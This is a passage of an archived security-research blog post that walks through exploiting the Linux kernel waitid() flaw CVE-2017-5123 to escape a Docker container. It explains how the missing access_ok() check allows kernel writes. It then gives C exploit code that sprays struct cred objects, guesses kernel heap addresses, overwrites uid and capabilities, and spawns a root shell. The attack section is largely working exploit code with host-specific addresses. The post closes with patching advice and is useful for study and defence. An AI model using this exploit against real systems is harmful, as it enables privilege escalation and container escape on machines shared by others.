&nbsp;&nbsp;&nbsp;&nbsp;user_access_begin();
&nbsp;&nbsp;&nbsp;&nbsp;unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);
&nbsp;&nbsp;&nbsp;&nbsp;unsafe_put_user(0, &amp;infop-&gt;si_errno, Efault);
&nbsp;&nbsp;&nbsp;&nbsp;unsafe_put_user(info.cause, &amp;infop-&gt;si_code, Efault);
&nbsp;&nbsp;&nbsp;&nbsp;unsafe_put_user(info.pid, &amp;infop-&gt;si_pid, Efault);
&nbsp;&nbsp;&nbsp;&nbsp;unsafe_put_user(info.uid, &amp;infop-&gt;si_uid, Efault);
&nbsp;&nbsp;&nbsp;&nbsp;unsafe_put_user(info.status, &amp;infop-&gt;si_status, Efault);
&nbsp;&nbsp;&nbsp;&nbsp;user_access_end();
&nbsp;&nbsp;&nbsp;&nbsp;return err;
Efault:
&nbsp;&nbsp;&nbsp;&nbsp;user_access_end();
&nbsp;&nbsp;&nbsp;&nbsp;return -EFAULT;
}

</pre><br>
The vulnerability is that the highlighted <code>access_ok()</code> check, which ensures that the user specified pointer is in fact a user-space pointer, was missing in the <code>waitid()</code> syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing <code>unsafe_put_user</code>.<br>
As we already know – we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.<p></p>
<p><code>Info.status</code> is a 32 bit int, but the value of status is constrained to<code> 0 &lt; status &gt; 256</code> as we can see in the <a href="http://tldp.org/LDP/abs/html/exitcodes.html">exit codes documentation</a>, and as we already know <code>pid</code> is constrained by <code>MAX_PID</code>.</p>
<p>At this point we have the ability to write a value of <code>pid</code> : &nbsp;<code>0 </code>&lt;<code> pid </code>&lt;<code> 0x8000</code> to anywhere we want. The next challenge is to detect where we should write in order to successfully overwrite the desired values.

We need to remember that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of <code>unsafe_put_user()</code>

So we will need to take into account the offset of <code>pid</code> inside the <code>infop struct</code> and use it to subtract that value from the target address that we want to write to, the target address is then passed into <code>waitid()</code> syscall as the <code>infop</code> pointer.

Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.


</p><h2><b>Spray n’ Pray</b></h2>
<p>I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of <code>struct creds</code> and then start guessing by writing to various addresses and pray to hit my target.</p>
<p>By picking a value that we can track such as <code>uid</code> (which we can track with <code>getuid()</code>).<br>
We can, with a little bit a luck, pinpoint our <code>struct cred</code> location, after which we will be able to write to specific offsets in order to overwrite the <code>capabilities</code>, <code>gid</code>, <code>euid</code> and anything else we want.<br>
But in order to do that we need to figure out the actual offsets, which we will do with the help of <code>gdb</code>:</p>
<p><img class="alignnone size-full wp-image-5851" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/gdb.png" alt="" width="733" height="170" srcset="https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png 733w, https://www.twistlock.com/wp-content/uploads/2017/12/gdb-300x70.png 300w" sizes="(max-width: 733px) 100vw, 733px"></p>
<p>As we can see,<code> kuid_t</code> is 4 bytes in size, as such if we found uid on <code>0xFFFF880023cc1004</code> than <code>gid</code> will be at <code>0xFFFF880023cc1008</code>, 4 bytes above, and <code>euid</code> will be at <code>0xFFFF880023CC1014</code> which is 4*0x4=0x10 bytes above our <code>uid</code> address as illustrated in the diagram below.</p>
<p><img class="alignnone size-full wp-image-5854" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/diagram.png" alt="" width="414" height="440" srcset="https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png 414w, https://www.twistlock.com/wp-content/uploads/2017/12/diagram-282x300.png 282w" sizes="(max-width: 414px) 100vw, 414px"></p>
<p>So essentially in order to overwrite our caps we will have to write to:<br>
<code>address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inheritable</code><br>
Note: These addresses are relevant to my system, your addresses might differ.</p>
<p>In order to find out where our sprayed <code>cred structs</code> might land in the heap we will use <code>gdb</code> again and set a breakpoint on<code> sys_getuid</code> in order to break when our program calls <code>getuid()</code>.</p>
<p>A few step commands after the breakpoint (it took 5 on my system) should reveal the <code>cred struct</code> address in the <code>RAX</code> register.</p>
<p>We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the <code>struct cred</code> is most likely to be in the heap</p>
<p>So the plan is as follows:</p>
<ol>
<li>Spawn thousands of processes by calling <code>fork()</code> in order to create thousands of <code>cred structs</code> in the kernel heap and make each of the processes constantly check if its UID==0 by calling <code>getuid()</code></li>
<li>Start writing the value 0 to addresses to which the<code> struct cred-&gt;uid</code> might land</li>
<li>If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the <code>uid</code> value with our guesses from step 2. Now we can overwrite the rest of the<code> cred struct</code> and change caps by writing to the offsets that we determined.</li>
</ol>
<p>Our dirty exploit will be something to the effect of:<br>
</p><pre>void writecaps(char *addr,unsigned long value){
while(1) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int pid = clone(exit_func, &amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!pid) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (pid == value) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {"/bin/sh", NULL};
for (int i=0;i&lt;5000;i++)
{
&nbsp;&nbsp;&nbsp;&nbsp;pid = fork();
&nbsp;&nbsp;&nbsp;&nbsp;if (pid==0)
&nbsp;&nbsp;&nbsp;&nbsp;{ // child process
&nbsp;&nbsp;while (1) {
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if (*glob_var==1) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall(SYS_exit, 0);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if (getuid() == 0){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//FOUND!!
&nbsp;&nbsp;&nbsp;&nbsp;printf("[+] Got UID: 0 !\n");
&nbsp;&nbsp;&nbsp;&nbsp; *glob_var = 1;
&nbsp;&nbsp;&nbsp;&nbsp; writecaps((char *)finalcapsaddress,value);
&nbsp;&nbsp;&nbsp;&nbsp;printf("Done, spawning a shell \n");
&nbsp;&nbsp;&nbsp;&nbsp;execve("/bin/sh", argv, NULL);
&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;else if(pid&lt;0)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("failed to fork");
&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;else //parent process
&nbsp;&nbsp;&nbsp;&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;}
}
}

void swapuid(){

&nbsp;&nbsp;&nbsp;&nbsp;char* i,p;
&nbsp;&nbsp;&nbsp;&nbsp;while(*glob_var!=1)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(*glob_var==1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("trying %p\n",i);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep(1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
munmap(glob_var, sizeof *glob_var);
printf("Found uid on %p\n",i-0xc0);
sleep(10000);
}

int main(void)
{
&nbsp;&nbsp;&nbsp;&nbsp;glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MAP_SHARED | MAP_ANONYMOUS, -1, 0);

&nbsp;&nbsp;&nbsp;&nbsp;*glob_var = 0;

unsigned long* base = findbase();
&nbsp;&nbsp;&nbsp;&nbsp;findheapbase();
&nbsp;&nbsp;&nbsp;&nbsp;spraynpray();
&nbsp;&nbsp;&nbsp;&nbsp;swapuid();
}

</pre><br>
After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.<p></p>
<h2><b>Conclusion</b></h2>
<p>In 2017 alone, <a href="https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33">434 linux kernel exploits where found</a>, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.</p>
<p>Thank you for reading and don’t forget to follow us <a href="https://twitter.com/TwistlockLabs">@TwistlockLabs</a>.</p>
<p>Big credits to <a href="https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/">Federico Bento</a> for pointing some things out and to <a href="https://salls.github.io/Linux-Kernel-CVE-2017-5123/">Chris Salls</a> for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.</p>

    <ul class="post-cats">
      <li>Categories:</li>

      <li><a href="https://www.twistlock.com/category/application-security/">Application Security</a></li><li><a href="https://www.twistlock.com/category/docker-security/">Docker Security</a></li><li><a href="https://www.twistlock.com/category/linux-security/">Linux Security</a></li><li><a href="https://www.twistlock.com/category/security-alerts/">Security Alerts</a></li><li><a href="https://www.twistlock.com/category/vulnerability-management/">Vulnerability Management</a></li>
      <span class="social-share">share: <div class="heateor_sss_sharing_container heateor_sss_horizontal_sharing" ss-offset="0" heateor-sss-data-href="https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/"><ul class="heateor_sss_sharing_ul"></ul></div></span>
    </ul>

    <div class="btm-post-author">
      <p class="btm-post-author-img" style="background-image: url(https://www.twistlock.com/wp-content/uploads/2017/12/22688906_10212548407357948_8187252496238917528_n-150x150.jpg);"></p>

      <div class="post-author-wrap">
        <h5 class="post-author-name"><a href="https://www.twistlock.com/about-us/team/daniel-shapira"></a><a href="https://www.twistlock.com/author/daniel-shapira/" title="Posts by Daniel Shapira" class="author url fn" rel="author">Daniel Shapira</a> | Security Researcher</h5>
        <p></p><p>Daniel is a Twistlock security researcher who embarked on this path as a black-hat hacker at the age of 13, and later on changed hats in order to move to security consulting, penetration testing and lastly security research. Daniel has previously worked at HP Software, WhiteHat Consulting, Nyotron and on numerous freelance security projects in the US &amp; Israel.</p>
<p></p>
      </div>
    </div>

    <div class="post-pag">
            <a href="https://www.twistlock.com/blog">← Back to All Posts</a>
      <a href="https://www.twistlock.com/2017/12/19/introduction-serverless-security-part-1/" style="">Next Post →</a>
    </div>
  </div></div></div><hr class="article__break"><div class="remark42 article__comments" id="to-comments">
    <iframe src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/iframe.html" width="100%" frameborder="0" allowtransparency="true" scrolling="no" tabindex="0" title="Remark42" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 298px;" horizontalscrolling="no" verticalscrolling="no"></iframe>
  </div></article></div><div class="footer page__footer"><hr><a href="http://radio-t.com/">Radio-T</a>, 2021<br><span class="footer__buildtime">built on Sun, 09 May 2021 19:39:03 GMT</span></div><div class="notifications"></div></div></div>
		<script>
			window.gitter = {
				chat: {
					options: {
						room: 'radio-t/chat'
					}
				}
			};
		</script>
		<script src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/sidecar.v1.js.下載" async="" defer=""></script>
	<script type="text/javascript" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/runtime.js.下載"></script><script type="text/javascript" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/vendors.component.js.下載"></script><script type="text/javascript" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/main.component.js.下載"></script><aside class="gitter-chat-embed is-collapsed"><div class="gitter-chat-embed-action-bar"><a class="gitter-chat-embed-action-bar-item gitter-chat-embed-action-bar-item-pop-out" aria-label="Open Chat in Gitter.im" href="https://gitter.im/radio-t/chat" target="_blank" rel="noopener"></a><button class="gitter-chat-embed-action-bar-item gitter-chat-embed-action-bar-item-collapse-chat" aria-label="Collapse Gitter Chat"></button></div><div class="gitter-chat-embed-loading-wrapper">
        <div class="gitter-chat-embed-loading-indicator gitter-icon"></div>
      </div></aside><a href="https://gitter.im/radio-t/chat" class="gitter-open-chat-button">Open Chat</a>
</body></html>